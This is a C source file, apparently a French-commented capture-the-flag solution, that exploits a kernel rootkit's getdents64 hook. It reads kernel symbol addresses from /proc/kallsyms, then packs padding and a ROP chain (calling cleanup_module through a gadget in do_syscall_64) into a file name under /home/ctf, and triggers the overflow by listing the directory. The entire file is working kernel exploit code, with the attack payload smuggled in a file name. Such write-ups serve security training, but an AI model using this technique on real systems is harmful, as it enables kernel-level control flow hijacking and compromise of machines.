#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <dirent.h>

#define BUFFSIZE 256

// gcc -static exploit.c -o exploit

/*
 lit l'addresse d'une fonction du kernel
 */
unsigned long long get_kernel_sym(char *name) {
    FILE *f;
    unsigned long long addr;
    char dummy;
    char sname[256];
    int ret = 0;

    f = fopen("/proc/kallsyms", "r");
    if (f == NULL) {
        printf("Failed to open /proc/kallsyms\n");
        _exit(-1);
    }
    printf("Finding %s...\n", name);
    while(ret != EOF) {
        ret = fscanf(f, "%llx %c %s\n", &addr, &dummy, sname);
        if (ret == 0) {
            ret = fscanf(f, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname)) {
            fclose(f);
            printf("Found %s at %llx\n", name, addr);
            return addr;
        }
    }
    fclose(f);
    return 0;
}


int main(int argc, char *argv[]) {
	int fd, ret;
	char buf[BUFFSIZE];
	unsigned long cleanup_module, do_syscall_64;

	// récupération des adresses de fonctions du kernel utiles
	do_syscall_64 = get_kernel_sym("do_syscall_64");
	cleanup_module = (unsigned long) get_kernel_sym("cleanup_module");

	// création d'un fichier "payload" vide
	memset(buf, 0, BUFFSIZE);
	strcpy(buf, "/home/ctf/ecsc_flag_");
	memset(buf+strlen(buf), 0x41, 102);

	unsigned long RopChain[] = {
		cleanup_module,	    // suppression des hooks du rootkit
		do_syscall_64+0xd2, // pop r12; pop rbp; ret
	};

	memcpy(buf+strlen(buf), RopChain, sizeof RopChain);
	
	printf("Trying to create %s file\n", buf );

	fd = open(buf, O_CREAT | O_WRONLY );
	if(fd < 0) {
                perror("open create");
                return -1;
        }
	close(fd);

	// on va maintenant faire lire le nom de fichier 
	// contenant le payload à la fonction du rootkit 
	fd = open("/home/ctf/", O_RDONLY | O_DIRECTORY | O_NONBLOCK | O_CLOEXEC);
	if(fd < 0) {
		perror("open dents");
		return -1;
	}

	// le syscall 217 correspond à getdents64 (cf. https://syscalls.w3challs.com/?arch=x86_64 )
	// le syscall renvoie une erreur, mais le payload fonctionne
	syscall(217, fd, buf, BUFFSIZE); 

	close(fd);
	printf("Done\n");

	return 0;
}
